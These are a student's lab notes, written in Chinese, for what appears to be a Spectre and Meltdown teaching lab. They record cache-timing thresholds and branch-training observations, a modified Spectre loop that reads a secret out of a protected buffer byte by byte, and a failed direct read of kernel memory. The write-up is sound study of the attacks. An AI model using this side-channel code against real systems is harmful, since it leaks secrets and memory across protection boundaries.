## Spectre Attack
>由于似乎不支持`__rdtscp`语句，后续所有代码都改为采用`clock_gettime`
### 任务 1
编译并运行`CacheTime`
![[Pasted image 20261015124733.png|388]]
可以看到数组3和7的访问速度明显比其他数组要快，阈值大概在81左右

### 任务 2
![[Pasted image 20261015125718.png|503]]
运行20次全部成功，后把阈值调整到60，则有两次没成功。

### 任务 3
编译并执行`SpectreExperiment`
![[Pasted image 20261015130631.png|488]]
- 备注掉`_mm_clflush(&size);`后编译执行
![[Pasted image 20261015130831.png|496]]
成功率明显断崖式下降
这是因为缺少了对内存中变量size的清除，cpu获取size不需要很长时间因此不会进行预测。
- 将第4行替换为`victim(i + 20)`
![[Pasted image 20261015130948.png|536]]
无法成功
因为这个改变使前面训练cpu的部分变成了训练cpu去预测输入值比size大，因此乱序执行的结果并不需要被抛弃

### 任务 4
编译并运行`SpectreAttack.c`
![[Pasted image 20261015132007.png|423]]

### 任务 5
![[Pasted image 20261015132509.png|323]]
- 出现0的得分最高的情况
这是由于`s = restrictedAccess(index_beyond);`语句的返回值为0，导致后续`array[0*4096 + DELTA] += 88`中0被加载进缓存了。
将max的初始值改为1，i也改为从1开始，来排除0的影响。
![[Pasted image 20261015133752.png|328]]
- 注释掉printf语句
![[Pasted image 20261015133927.png|472]]
- `usleep`
原值为10，十次里成功十次
改为100，十次里成功十次
改为1000，十次里成功十次

### 任务 6
给攻击增加一个循环，每次循环index_beyond增加1
```c
int main() {
  int i;
  uint8_t s;
  size_t index_beyond = (size_t)(secret - (char*)buffer);

  int secret_index[17]={0,};

  for(int j = 0; j<17; j++){
    flushSideChannel();
    for(i=0;i<256; i++) scores[i]=0;

    for (i = 0; i < 1000; i++) {
      printf("*****\n");  // This seemly "useless" line is necessary for the attack to succeed
      spectreAttack(index_beyond);
      usleep(10);
      reloadSideChannelImproved();
    }

    int max = 1;
    for (i = 1; i < 256; i++){
      if(scores[max] < scores[i]) max = i;
    }
    secret_index[j] = max;
    index_beyond++;
  }
  printf("Reading secret value at index %ld\n", index_beyond);
  for(int j = 0;j < 17;j++){
    printf("%c",secret_index[j]);
  }
  printf("\n");
  return (0);
}
```
![[Pasted image 20261015135259.png]]
成功

## Meltdown Attack
>[[#任务 1]]和[[#任务 2]]同[[#Spectre Attack]]
### 任务 3
编译和执行
![[Pasted image 20261015140219.png]]
地址为`00000000715ffb05`
### 任务 4
 ```c
 int main() {
	 char *kernel_data_addr = (char*)0x00000000715ffb05;
	 char kernel_data = *kernel_data_addr;
	 printf("I have reached here.\n");
	 return 0;
 }
 ```
 ![[Pasted image 20261015140709.png]]
并不能直接获取内核内存

### 任务 5
![[Pasted image 20261015140841.png]]程序继续运行

### 任务 6
![[Pasted image 20261015141251.png]]
从`array[7*4096 + 1024] is in cache`可以看出，尽管前一行代码引起了异常，但`array[7*4096 + 1024]`仍然被乱序执行了。